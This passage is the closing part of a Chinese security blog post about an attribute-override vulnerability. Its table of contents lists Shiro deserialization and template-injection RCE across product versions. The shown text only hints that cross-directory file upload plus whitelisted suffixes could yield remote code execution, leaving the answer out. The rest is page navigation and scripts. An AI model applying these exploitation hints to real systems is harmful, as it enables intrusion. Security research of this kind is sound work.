href="https://www.cnblogs.com/escape-w/p/17326592.html)%EF%BC%8C%E8%99%BD%E7%84%B6%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%BF%99%E4%BA%9B%E9%97%AE%E9%A2%98%E5%B0%B1%E6%98%AF%E4%BA%86">https://www.cnblogs.com/escape-w/p/17326592.html)，虽然这个项目不存在这些问题就是了</a></p><p>那么如何才能rce呢？提示一下，我们知道此时文件上传其实仍然能够跨目录写的，那么只能从白名单中受限的后缀入手，发挥你的想象，这里就不直接给出答案了</p></div></article><div class="blog-post-comments"><div id="utterances_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">又又又是一个属性覆盖带来的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%90%8E%E7%AB%AF%E6%A1%86%E6%9E%B6%E4%BF%A1%E6%81%AF%E6%A2%B3%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">前后端框架信息梳理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E7%89%88%E6%9C%AC-lt-5-2-8"><span class="toc-number">1.2.</span> <span class="toc-text">Shiro反序列化(版本&lt;&#x3D;5.2.8 )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E6%A8%A1%E6%9D%BFSSTIRCE%E5%88%A9%E7%94%A8%E5%8F%B2"><span class="toc-number">1.3.</span> <span class="toc-text">前台模板SSTIRCE利用史</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#V-lt-5-2-5"><span class="toc-number">1.3.1.</span> <span class="toc-text">V&lt;&#x3D;5.2.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#V-lt-5-2-8"><span class="toc-number">1.3.2.</span> <span class="toc-text">V&lt;&#x3D;5.2.8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#V-lt-5-3-5-%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88"><span class="toc-number">1.3.3.</span> <span class="toc-text">V&lt;&#x3D;5.3.5(目前最新版)</span></a></li></ol></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&text=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&is_video=false&description=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=又又又是一个属性覆盖带来的漏洞&body=Check out this article: https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&name=又又又是一个属性覆盖带来的漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&t=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2024 Y4tacker</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul><ul><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 </span><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数<span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script type="text/javascript">$(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })</script><script src="/js/main.js"></script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script type="text/javascript">var utterances_repo="Y4tacker/y4tacker.github.io",utterances_issue_term="pathname",utterances_label="Comment",utterances_theme="github-dark";!function(){var t=document.createElement("script");t.src="https://utteranc.es/client.js",t.setAttribute("repo",utterances_repo),t.setAttribute("issue-term","pathname"),t.setAttribute("label",utterances_label),t.setAttribute("theme",utterances_theme),t.setAttribute("crossorigin","anonymous"),t.async=!0,document.getElementById("utterances_thread").appendChild(t)}()</script></body></html>